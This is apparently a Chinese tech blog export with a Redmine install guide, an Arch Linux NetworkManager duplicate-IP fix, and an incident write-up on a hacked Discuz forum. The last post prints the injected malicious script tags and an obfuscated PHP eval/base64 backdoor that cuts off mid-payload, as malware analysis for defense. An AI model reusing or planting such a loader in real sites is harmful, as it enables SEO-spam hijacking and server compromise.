#66cccc;\">'localhost'</span>;\n</pre>\n</div>\n</li>\n\n<li>修改数据库配置文件\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">cp config/database.yml.example config/database.yml\ndiff config/database.yml config/database.yml.example\n10,11c10,11\n&lt;   username: redmine\n&lt;   password: <span style=\"color: #66cccc;\">\"redmine\"</span>\n---\n&gt;   username: root\n&gt;   password: <span style=\"color: #66cccc;\">\"\"</span>\n</pre>\n</div>\n</li>\n\n<li>初始化会话存储\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">rake generate_secret_token\n</pre>\n</div>\n</li>\n\n<li>创建数据库表结构\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #ffcc66;\">RAILS_ENV</span>=production rake db:migrate\n</pre>\n</div>\n</li>\n\n<li>解决上一步可能出现的错误\n\n<blockquote>\n<p>\nrake aborted!\nCan't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)\n</p>\n\n<p>\nTasks: TOP =&gt; db:migrate =&gt; environment\n</p>\n</blockquote>\n\n<p>\n确定 <code>mysql</code> 启动时指定的 <code>mysql.sock</code> 文件的路径\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">ps aux | grep mysql.sock\n</pre>\n</div>\n\n<p>\n显示的 <code>mysql.sock</code> 路径可能为“ <code>--socket=/tmp/mysql.sock</code> ”\n</p>\n\n<p>\n修改 <code>redmine</code> 数据库配置，在 <code>production</code> 配置中添加 <code>socket</code> 项：\n</p>\n\n<pre class=\"example\">\nproduction:\n  ...\n  socket: /tmp/mysql.sock\n</pre>\n\n<p>\n重新进行上一步操作。\n</p>\n</li>\n\n<li>初始化数据\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #ffcc66;\">RAILS_ENV</span>=production <span style=\"color: #ffcc66;\">REDMINE_LANG</span>=zh rake redmine:load_default_data\n</pre>\n</div>\n</li>\n\n<li>创建相关目录\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir -p tmp tmp/pdf public/plugin_assets\nsudo chown -R nobody:nobody files log tmp public/plugin_assets\nsudo chmod -R 755 files log tmp public/plugin_assets\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">试运行 <code>redmine</code></h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">ruby script/rails server webrick -e production\n</pre>\n</div>\n\n<ul class=\"org-ul\">\n<li>浏览器打开页面\n\n<p>\n<a href=\"http://localhost:3000\">http://localhost:3000</a>\n</p>\n\n<p>\n使用 用户名 <code>admin</code> ，密码 <code>admin</code> 登录后，立即修改密码。\n</p>\n\n<p>\n使用下面的命令生成随机的密码：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">cat /dev/urandom | head -1 | md5sum | head -c 8\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">配置 <code>redmine</code></h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li>修改 <code>config/settings.yml</code>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">使用 <code>Nginx</code> 和 <code>passenger</code></h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget <span style=\"color: #66cccc;\">'http://nginx.org/download/nginx-1.4.6.tar.gz'</span>\ntar xzvf nginx-1.4.6.tar.gz\ngem install passenger\nyum install pcre-devel\npassenger-install-nginx-module\n</pre>\n</div>\n\n<ul class=\"org-ul\">\n<li>交互式安装过程\n\n<ul class=\"org-ul\">\n<li>Automatically download and install Nginx?\n\n<p>\n选 2. No: I want to customize my Nginx installation. (for advanced users)\n</p>\n</li>\n\n<li>Where is your Nginx source code located?\n\n<p>\n填解压的 <code>nginx</code> 源码包路径\n</p>\n</li>\n\n<li>Where do you want to install Nginx to?\n\n<p>\n填 <code>/usr/local/nginx</code>\n</p>\n</li>\n</ul>\n</li>\n\n<li>修改 /usr/local/nginx/conf/nginx.conf\n\n<p>\n在最后的 <code>}</code> 前添加以下配置\n</p>\n\n<pre class=\"example\">\ninclude vhosts/*.conf;\n</pre>\n</li>\n\n<li>添加站点配置文件 <code>/usr/local/nginx/conf/vhosts/redmine.conf</code>\n\n<pre class=\"example\">\nserver {\n  listen  80;\n  server_name &lt;域名&gt;;\n  root &lt;redmine根目录&gt;/public;\n  passenger_enabled on;\n  client_max_body_size 10m; # Max attachemnt size\n}\n</pre>\n</li>\n\n<li>启动 <code>nginx</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">/usr/local/nginx/sbin/nginx\n</pre>\n</div>\n</li>\n\n<li>现在可以正式访问站点了\n\n<p>\n<a href=\"http://\">http://</a>&lt;域名&gt;\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-7\" class=\"outline-2\">\n<h2 id=\"sec-7\">支持 <code>OpenID</code> 第三方帐号登录</h2>\n<div class=\"outline-text-2\" id=\"text-7\">\n<ul class=\"org-ul\">\n<li>安装 <code>openid</code> 库\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gem install ruby-openid\n</pre>\n</div>\n</li>\n\n<li>使用 <code>admin</code> 帐号登录系统，在“管理 - 配置 - 认证”中勾选上“允许使用OpenID登录和注册”。 \n</li>\n\n<li>用户注册时“密码”可以省略， 填上 <code>OpenID URL</code> 即可。\n</li>\n\n<li>如何获得Google的OpenID URL？\n\n<ul class=\"org-ul\">\n<li>先在 <code>Google</code> 的站点上登录\n</li>\n<li>打开 <a href=\"https://profiles.google.com\">https://profiles.google.com</a> 后会跳转到类似这样（ <code>https://plus.google.com/000000000000000000000/posts</code> ）的网页\n</li>\n<li>你的 <code>OpenID URL</code> 为 <a href=\"http://profiles.google.com/000000000000000000000\">http://profiles.google.com/000000000000000000000</a>\n</li>\n</ul>\n<p>\n上面的 <code>000000000000000000000</code> 可能为任意的数字串\n</p>\n</li>\n\n<li>管理员确认注册后即可在登录界面上输入 <code>OpenID URL</code> 直接登录\n\n<p>\n一般浏览器的输入框是有记忆功能的，双击后会出现输入历史下拉列表，直接选择即可。\n</p>\n</li>\n\n<li>安装插件简化 <code>OpenID</code> 登录\n\n<ul class=\"org-ul\">\n<li><a href=\"https://github.com/jorgebg/redmine-openid-selector\">https://github.com/jorgebg/redmine-openid-selector</a> （不推荐） 为原始分枝，在 <code>redmine-2.5.0</code> 下不能直接安装会导致站点登录界面出现404错误，解决方案在 <a href=\"http://www.redmine.org/boards/3/topics/34327?r=38778#message-38778\">这里</a> ，简而言之就是把插件目录名中的 <code>-</code> 改为 <code>_</code> 。\n</li>\n\n<li><a href=\"https://github.com/computerminds/redmine_openid_selector\">https://github.com/computerminds/redmine_openid_selector</a> （不推荐） 这个分枝安装后可用，但界面为英文（其实界面就一句英文）。\n</li>\n\n<li><a href=\"https://github.com/tangxinfa/redmine_openid_selector\">https://github.com/tangxinfa/redmine_openid_selector</a> （推荐） 为支持中文我fork了上一个分枝。\n</li>\n\n<li>通用的插件安装过程：\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd</span> plugins\ngit clone https://github.com/tangxinfa/redmine_openid_selector.git\nrake redmine:plugins:migrate <span style=\"color: #ffcc66;\">RAILS_ENV</span>=production\ntouch tmp/restart.txt\n</pre>\n</div>\n</li>\n\n<li>通用的插件卸载过程：\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">rake redmine:plugins:migrate <span style=\"color: #ffcc66;\">NAME</span>=redmine-openid-selector <span style=\"color: #ffcc66;\">VERSION</span>=0 <span style=\"color: #ffcc66;\">RAILS_ENV</span>=pr<span style=\"text-decoration: underline;\">oduction</span>\nrm -rf plugins/redmine-openid-selector\ntouch tmp/restart.txt\n</pre>\n</div>\n</li>\n</ul>\n<p>\n现在在登录及注册页面直接点击第三方站点Logo即可。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-8\" class=\"outline-2\">\n<h2 id=\"sec-8\">样式美化</h2>\n<div class=\"outline-text-2\" id=\"text-8\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone git://github.com/pixel-cookers/redmine-theme.git public/themes/pixel-c<span style=\"text-decoration: underline;\">ookers</span>\ntouch tmp/restart.txt\n</pre>\n</div>\n\n<p>\n现在可以使用 <code>admin</code> 登录后台，在“管理 - 配置 - 显示 - 主题”中启用主题 <code>Pixel-cookers</code> 。</p>\n</div>\n</div>\n"
},
{
  "title": "Archlinux网络接口上出现两个IP",
  "timestamp": "2014-03-12 11:32:00",
  "tags": [
    "archlinux",
    "network"
  ],
  "body": "<ul class=\"org-ul\">\n<li>发现两个IP\n\n<p>\n我的电脑是直接连到公司的墙上的网口上网的，在测试路由器的时候，我把路由器的WAN口接墙上的网口，然后电脑连到路由器的LAN口上，上网正常。查看分配到的IP为192.168.111.2，路由器的IP为192.168.111.1， 想到我一直用 <code>192.168.90.73</code> 这个IP，有些配置也依赖这个IP，所以还想分到这个IP，所以把路由器的DHCP做了设置，路由器IP改为192.168.90.74，分配的IP范围为192.168.90.71-192.168.90.73，再次重连电脑分配的IP为192.168.90.71，然后发现上不了网了，浏览器上输入路由器的IP（192.168.90.74）竟然打开了我机器（192.168.90.71）上建的WEB服务，其他人连这个网络却可以通过192.168.90.74这个IP正常打开路由器界面，最终通过“ip address show”这个命令发现我的网口上有两个IP（192.168.90.71、192.168.90.74）， <code>ipconfig</code> 和其它GUI工具只能看到第一个IP。\n</p>\n</li>\n\n<li>第二个IP是怎么来的？\n\n<p>\n抓包分析了一下DHCP网络包，只给分配了192.168.90.71这个IP，看来192.168.90.74这个IP是我机器上配置的，于是搜索/etc、/var下的文件，最后在/var/log/journal/*/system.journal中找到了日志：\n</p>\n\n<pre class=\"example\">\nNetworkManager[375]: &lt;debug&gt; [1394509845.924245] [nm-system.c:280] sync_addresses(): (eno1): adding address '192.168.90.74/24'\n</pre>\n\n<p>\n然后在NetworkManager的配置文件 <code>/etc/NetworkManager/system-connections/Profile 1</code> 中找到了相关配置：\n</p>\n\n<pre class=\"example\">\n[ipv4]\nmethod=auto\naddress1=192.168.90.74/24,192.168.90.2\n</pre>\n\n<p>\n删除掉 <code>address1</code> 后，再重连网络，就只有一个IP了。\n</p>\n\n<p>\n这应该是 <code>NetworkManager</code> 的一个 <a href=\"https://bugs.archlinux.org/task/41395\">BUG</a> ，当手动设置IP后切回DHCP自动获取IP方式时不清除手动设置的时会出现。</p>\n</li>\n</ul>\n"
},
{
  "title": "论坛被挂暗链问题分析与解决",
  "timestamp": "2014-04-01 21:38:00",
  "tags": [
    "discuz",
    "security",
    "web"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">发现问题</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：\n</p>\n\n\n<div class=\"figure\">\n<p><img src=\"../static/site_attacked.png\" alt=\"site_attacked.png\" />\n</p>\n</div>\n\n<p>\n直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">解决问题</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。\n</p>\n\n<ul class=\"org-ul\">\n<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获\n</li>\n\n<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧\n</li>\n\n<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> \n\n<p>\n在代码和数据库中搜索这个js找不到任何信息。\n</p>\n\n<ul class=\"org-ul\">\n<li>将恶意站点配置一条 <code>hosts</code> \n\n<pre class=\"example\">\n127.0.0.1 api.discuz.com.de\n</pre>\n</li>\n</ul>\n<p>\n浏览器不再自动跳转到恶意网站了。 \n</p>\n</li>\n\n<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-html\">&lt;<span style=\"color: #f99157;\">div</span> <span style=\"color: #ffcc66;\">style</span>='display:none'&gt;&lt;<span style=\"color: #f99157;\">script</span> <span style=\"color: #ffcc66;\">language</span>='javascript' <span style=\"color: #ffcc66;\">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style=\"color: #ffcc66;\">&amp;logo</span>=1' <span style=\"color: #ffcc66;\">charset</span>='gb2312'&gt;&lt;/<span style=\"color: #f99157;\">script</span>&gt;&lt;/<span style=\"color: #f99157;\">div</span>&gt;&lt;<span style=\"color: #f99157;\">script</span> <span style=\"color: #ffcc66;\">type</span>='text/javascript' <span style=\"color: #ffcc66;\">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style=\"color: #f99157;\">script</span>&gt;\n</pre>\n</div>\n</li>\n\n<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #6699cc;\">INCLUDE</span>(pack(<span style=\"color: #66cccc;\">'H*'</span>,<span style=\"color: #66cccc;\">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style=\"text-decoration: underline;\">));</span>\n</pre>\n</div>\n\n<p>\n上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。\n</p>\n\n<p>\n删除该语句后问题解决。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">分析恶意代码</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">O00OO0</span>=urldecode(<span style=\"color: #66cccc;\">\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style=\"color: #66cccc; text-decoration: underline;\">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\"</span><span style=\"text-decoration: underline;\">);</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00O0O</span><span style=\"text-decoration: underline;\">=</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{3}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{6}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{33}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{30};</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O0OO00</span><span style=\"text-decoration: underline;\">=</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{33}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{10}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{24}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{10}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{24};</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">OO0O00</span><span style=\"text-decoration: underline;\">=</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O0OO00</span><span style=\"text-decoration: underline;\">{0}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{18}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{3}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O0OO00</span><span style=\"text-decoration: underline;\">{0}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O0OO00</span><span style=\"text-decoration: underline;\">{1}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{24};</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">OO0000</span><span style=\"text-decoration: underline;\">=</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{7}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{13};</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00O0O</span><span style=\"text-decoration: underline;\">.=</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{22}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{36}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{29}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{26}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{30}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{32}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{35}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{26}.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0</span><span style=\"text-decoration: underline;\">{30};</span><span style=\"color: #99cc99; text-decoration: underline;\">eval</span><span style=\"text-decoration: underline;\">(</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">O00O0O</span><span style=\"text-decoration: underline;\">(</span><span style=\"color: #66cccc; text-decoration: underline;\">\"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2I